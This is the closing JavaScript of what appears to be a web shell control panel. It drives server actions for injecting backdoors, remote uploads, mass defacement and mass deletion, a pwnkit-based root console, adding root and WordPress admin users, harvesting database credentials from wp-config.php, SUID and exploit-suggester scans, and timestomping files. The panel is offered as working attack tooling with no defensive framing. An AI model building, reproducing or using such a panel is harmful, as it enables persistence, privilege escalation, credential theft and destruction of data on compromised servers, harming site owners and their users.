    saveFileBtn?.addEventListener('click',()=>{const fd=new FormData();fd.append('action','save_content');fd.append('file',currentEditingFile);fd.append('content',editorContent.value);ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok')modals.editorModal.hide();});});

    function escapeHtml(t){return t.replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'})[m]);}
    function basename(p){return p.split('/').reverse()[0].split('\\').reverse()[0];}

    const injectForm=document.getElementById('injectForm');if(injectForm){injectForm.addEventListener('submit',e=>{e.preventDefault();if(confirm('Are you sure?')){const fd=new FormData(e.target);fd.append('action','inject_backdoor');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok'){document.getElementById('injectSuccessMessage').classList.remove('d-none');}});}});}
    document.getElementById('injectModal')?.addEventListener('hidden.bs.modal',()=>document.getElementById('injectSuccessMessage').classList.add('d-none'));
    document.getElementById('remoteUploadForm')?.addEventListener('submit',e=>{e.preventDefault();const fd=new FormData(e.target);fd.append('action','remote_upload');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok'){modals.uploadModal.hide();setTimeout(()=>location.reload(),1e3);}});});
    document.querySelectorAll('.network-form').forEach(f=>f.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('networkOutput');o.innerHTML='Executing...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','network');ajaxRequest(fd,d=>o.innerText=d.output);}));
    document.getElementById('massDefaceForm')?.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('massOutput');o.innerHTML='Processing...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','mass_deface');ajaxRequest(fd,d=>o.innerText=d.output);});
    document.getElementById('massDeleteForm')?.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('massOutput');o.innerHTML='Processing...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','mass_delete');ajaxRequest(fd,d=>o.innerText=d.output);});
    
    document.getElementById('btnTerminal')?.addEventListener('click',()=>{currentConsoleMode='user';modals.rootConsoleModal.show();});
    document.getElementById('btnRootShell')?.addEventListener('click',()=>{currentConsoleMode='root';modals.rootConsoleModal.show();});
    document.getElementById('rootConsoleModal')?.addEventListener('shown.bs.modal',()=>{const st=document.getElementById('pwnkitStatus'),pr=document.getElementById('promptIndicator'),inp=document.getElementById('rootCmdInput'),outp=document.getElementById('rootCmdOutput');outp.innerHTML='# Output...';inp.value='';if(currentConsoleMode==='root'){st.textContent='Attempting root...';st.className='alert alert-info';pr.textContent='#';const fd=new FormData();fd.append('action','check_pwnkit_status');ajaxRequest(fd,d=>{isPwnkitVulnerable=d.vulnerable;st.textContent=d.message;st.className=`alert ${d.vulnerable?'alert-success':'alert-danger'}`;pr.textContent=d.vulnerable?'#':'$';});}else{st.textContent='Regular console.';st.className='alert alert-secondary';pr.textContent='$';const fd=new FormData();fd.append('action','check_pwnkit_status');ajaxRequest(fd,d=>{isPwnkitVulnerable=d.vulnerable;if(d.vulnerable){pr.textContent='#';st.textContent='Root access detected.';st.className='alert alert-success';}});}});
    document.getElementById('rootCmdForm')?.addEventListener('submit',e=>{e.preventDefault();const inp=document.getElementById('rootCmdInput'),outp=document.getElementById('rootCmdOutput'),fd=new FormData();let act='cmd',prmpt='$';if(currentConsoleMode==='root'){if(isPwnkitVulnerable){act='root_cmd';prmpt='#';}else{outp.innerHTML+=`<span style="color:var(--danger-color);">Root failed.</span>\n`;}}else{if(isPwnkitVulnerable){act='root_cmd';prmpt='#';}}fd.append('action',act);fd.append('cmd',inp.value);outp.innerHTML+=`\n<span style="color:var(--primary-accent);">${prmpt} ${escapeHtml(inp.value)}</span>\n`;ajaxRequest(fd,d=>{outp.innerHTML+=d.output||'Error';outp.scrollTop=outp.scrollHeight;inp.value='';});});
    document.getElementById('destroyerBtn')?.addEventListener('click',e=>{e.preventDefault();if(confirm('ARE YOU SURE?')){const o=document.getElementById('securityOutput');o.innerText='Activating...';o.classList.remove('d-none');const fd=new FormData();fd.append('action','backdoor_destroyer');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');o.innerText=d.message;});}});
    document.getElementById('lockItemForm')?.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('securityOutput');o.innerText='Locking...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','lock_item');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');o.innerText=d.message;});});
    document.getElementById('addRootUserForm')?.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('usersOutput');o.innerText='Adding root user...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','add_root_user');ajaxRequest(fd,d=>{o.innerText=d.output||d.message;});});
    document.getElementById('addWpUserForm')?.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('usersOutput');o.innerText='Adding WP admin...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','add_wp_user');ajaxRequest(fd,d=>{o.innerText=d.output||d.message;});});
    document.getElementById('parseWpConfigBtn')?.addEventListener('click',e=>{e.preventDefault();const o=document.getElementById('usersOutput');o.innerText='Searching wp-config.php...';o.classList.remove('d-none');const fd=new FormData();fd.append('action','parse_wp_config');const mp=document.getElementById('wpConfigPath').value;if(mp)fd.append('config_path',mp);ajaxRequest(fd,d=>{if(d.status==='ok'){o.innerText='Parsed creds from: '.concat(d.path);document.getElementById('db_host').value=d.creds.db_host||'';document.getElementById('db_name').value=d.creds.db_name||'';document.getElementById('db_user').value=d.creds.db_user||'';document.getElementById('db_pass').value=d.creds.db_password||'';}else{o.innerText=d.message;}});});
    
    function setupScanButton(btnId, outId, action) {
        document.getElementById(btnId)?.addEventListener('click', () => {
            const outEl = document.getElementById(outId);
            outEl.innerHTML = 'Scanning... This may take a moment.';
            outEl.classList.remove('d-none');
            const fd = new FormData();
            fd.append('action', action);
            ajaxRequest(fd, d => {
                outEl.innerHTML = `<pre>${escapeHtml(d.output || d.message)}</pre>`;
                outEl.scrollTop = outEl.scrollHeight;
            });
        });
    }
    setupScanButton('startAutoScanBtn', 'autoScanOutput', 'scan_root');
    setupScanButton('startSuidScanBtn', 'suidScanOutput', 'scan_suid');
    setupScanButton('startExploitSuggesterBtn', 'exploitSuggesterOutput', 'exploit_suggester');

    window._js_stm=function(fp,cmt){const m=modals['touchModal'],f=document.getElementById('touchForm');f.querySelector('input[name="file_to_touch_name"]').value=fp;f.querySelector('input[name="datetime_value"]').value=cmt;m.show();};
    document.getElementById('touchForm')?.addEventListener('submit',async function(e){e.preventDefault();const fd=new FormData(this);fd.append('action','touch_item');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok'){modals['touchModal'].hide();setTimeout(()=>location.reload(),1e3);}});});
    window._js_scm=function(ip,cp){const m=modals['chmodModal'],f=document.getElementById('chmodForm');f.querySelector('input[name="target_path"]').value=ip;f.querySelector('input[name="perms_octal"]').value=cp.replace(/[^0-7]/g,'').slice(-4);m.show();};
    document.getElementById('chmodForm')?.addEventListener('submit',async function(e){e.preventDefault();const fd=new FormData(this);fd.append('action','chmod_item');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok'){modals['chmodModal'].hide();setTimeout(()=>location.reload(),1e3);}});});
    document.getElementById('massDateTimeChangeForm')?.addEventListener('submit',async function(e){e.preventDefault();const o=document.getElementById('massDateTimeChangeOutput');o.innerHTML='Processing...';o.classList.remove('d-none');const fd=new FormData(this);fd.append('action','mass_datetime_change');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');o.innerText=d.output||d.message;o.scrollTop=o.scrollHeight;});});
});
</script>
</body>
</html>
